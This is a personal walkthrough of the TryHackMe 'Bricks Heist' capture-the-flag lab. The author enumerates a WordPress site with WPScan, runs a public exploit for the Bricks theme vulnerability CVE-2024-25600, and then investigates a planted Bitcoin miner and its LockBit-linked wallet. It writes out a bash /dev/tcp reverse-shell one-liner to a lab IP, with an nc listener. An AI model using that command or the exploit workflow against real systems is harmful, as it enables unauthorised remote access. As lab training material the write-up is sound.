# Documentation

### Step 1: Recon & Initial Investigation

  - Upon entering the TryHack3M: Bricks Heist room, I started both the AttackBox and the victim system.
  
  - The first instructions state to add the IP to the /etc/hosts file within the AttackBox.
    
  - To do this, I first used the command "cat /etc/hosts" to see what was already in the file.
  
  - I then entered the command, "sudo nano /etc/hosts" to open the file as a .txt document for editing.
  
  - I added a new line under the IP 127.0.1.1, the new line reads, "10.10.240.33 (tab) bricks.thm".
  
  - Since the instructions wanted this IP added to the hosts file, I theorized that it was a webpage. 
  
  - I tested this theory by opening Mozilla Firefox and entering "https://bricks.thm" into the search bar and a webpage loaded that had the title, "Brick by Brick!" with a photo of bricks.
  
  - I decided to investigate the source code of the webpage using CTRL+U.
  
  - I noticed multiple references of "wp-", leading me to believe it was referencing WordPress, so I decided to try WPScan.

  - I opened the terminal and ran the command for WPScan.
    ```bash
    wpscan --url https://bricks.thm/
    ```
      - The scan aborted, "url seems to be down, SSL peer certificate or SSH remote key was not OK".
      - Retried scan while disabling the tls certificate check.
        ```bash
         wpscan --url https://bricks.thm/ --disable-tls-checks
        ```
        
  - The scan ran successfully, the results showed the style "bricks" for WordPress, and the version was 1.9.5.

  - I used Google to search for "bricks 1.9.5" and the results showed that this was a vulnerable version of bricks, and there was an exploit available for this vulnerability (CVE-2024-25600) on GitHub.

    ### Step 2: Exploitation

  - I copied the raw exploit code for the bricks version 1.9.5 vulnerability from GitHub and pasted it into a nano .txt file titled, "shell.py".

  - Opened a terminal and ran the command, ```python3 shell.py -u https://bricks.thm```
    - There was an error running the script, a few modules needed to be installed first.
      - Installed rich module
        ``` bash
        pip3 install rich
        ```
        - Retried the python script, another error occured.
          - Installed prompt-toolkit module
            ``` bash
            pip3 install prompt-toolkit
            ```
            - Retried the python script, yet another error occured.
              - Installed alive-progress module
                ``` bash
                pip3 install alive-progress
                ```
                - Ran python script, it finally worked and the vulnerability was confirmed to be present.
  
  ### Step 3: Exploring Initial Access

  - I ran the command "whoami" to discover who I was logged into.
      ``` bash
      whoami
      ```
    - Results: Apache

    - I ran the command "pwd" to discover where I was located within the file directories.
      ``` bash
      pwd
      ```
        - Results: /data/www/default

        - I attempted to change directories by using "cd /home"
          ``` bash
          cd /home
          ```
            - Results: Deprecated connection. This means that the shell we are using is unstable.
    
    -  I then attempted to set up a reverse shell to hopefully have access to a more stable shell.
      ``` bash
      bash -c 'exec bash -i &>/dev/tcp/10.10.96.228/4444 <&1'
      ```
    - Before executing the reverse shell command, I opened another terminal to set up a listener on port 4444.
    ``` bash
      nc -lvnp 4444
    ```
      - Executed the reverse shell command, the initial access shell closed and a new connection began within the terminal with the listener.
        
      - We then had a stable connection to the shell where we could further explore.
        
          - I began exploring by running the
        ``` bash ls ```
        command to see what was within the current directory.
        
          - The results showed a list of .txt and .php files.

    - There were two .txt files that could be seen, one of which had a very long, odd name.
   
    - I used cat to open the file.
        ```bash
        cat 650c844110baced87e1606453b93f22a.txt
        ```
        - Within this file, the flag was found, answering the first question of the room.
        - There were a few other interesting files, such as wp-config.php, which shows hard-coded credentials for the phpMyAdmin page. We might come back to this             later.
     
  ## Step 4: Identifying the Suspicious Process
  
  - I had to use Google to find the command for Linux to show running processes on a system.
    ``` bash
    systemctl --type=service --state=running
    ```
    - Among the list of running services shown, I saw one that really stuck out, it was labeled as ubuntu.service and the description was "TRYHACK3M".
        - I used the cat command to look further into the process.
          ``` bash
          systemctl cat ubuntu.service
          ```
          - By doing this, I was able to see that the service was running from a directory located in /lib/NetworkManager/nm-inet-dialog.
              - This gave me the answer to question two for the room.
                
          - I changed directories to /lib/NetworkManager to investigate further.
            ``` bash
            cd /lib/NetworkManager
            ```
          - I used the ls command to attempt to discover other files located within this directory, I wanted to see more information so I used the command ls -l.
            ``` bash
            ls -l
            ```
            - Within this list, there was one file that had read-only permissions, named inet.conf.
              
            - I tried the cat command on the inet.conf file, but it was just a lot of lines repeating the same things, "2024-04-11 10:53:02, 04, 06, 08... [*]                   Miner()" etc. This led me to think that this process could be some sort of crypto miner and its logs.
            
            - To get a better idea of what exactly was inside of this process, I decided to use the command head, instead of cat.
              ``` bash
              head inet.conf
              ```
              - Doing this confirmed my suspicions of this being a crypto miner, it is a Bitcoin Miner to be exact, and this is where the logs could be found. This gave me the answer to question four.
                
              - This also confirmed that the ubuntu.service process was affiliated with the suspicious process, giving me the answer for question three.
                
- Using the head command, I also was able to find an ID. I thought it might have been encoded, so I used Google to find a website to quickly decode it.
  
    - I was able to find a website called CyberChef. I copied and pasted the ID into the input and hit the magic wand since I wasn't sure exactly what it was             encoded using.
      
      - At the bottom of the output box, there was a counter to see how many characters were in the output. The output was 85 characters long.
        
          - Since it's an ID for a Bitcoin Miner, I searched on Google to see how long Bitcoin wallet addresses are, the results said they are between 26 and 35                 characters.
            
              - I decided to put the decoded ID into nano to try different combinations. The string of characters was odd, so I couldn't break it into 2 even                       strings.
                
              - I realized it was almost the same string of characters, one just had an extra character. I copied the shorter string and pasted it into a website                   I found using Google to check the status of Bitcoin wallets.
            
  ## Step 5: Investigating the BTC Address

  - The website confirmed the address as a Bitcoin Wallet and also showed the transaction logs, giving me the answer for question five in this room,                   bc1qyk79fcp9hd5kreprce89tkh4wrtl8avtl67qa.
    
  - This wallet had 8 transactions listed.
    
  - Received 15.53073303 BTC.
    
  - Sent 15.53073303 BTC.
    
  - This wallet has moved a total volume of 31.06146606 BTC.
    
  - The current value of the wallet is 0 BTC.
    
      - I used Google to search for the BTC wallet address that this wallet received money from to see if anything would come up.
   
      - A few different websites popped up, I decided to click one and do a little reading.
   
          - This wallet is currently under sanctions for being connected to the LockBit ransomware. This gave me my final answer for this room.
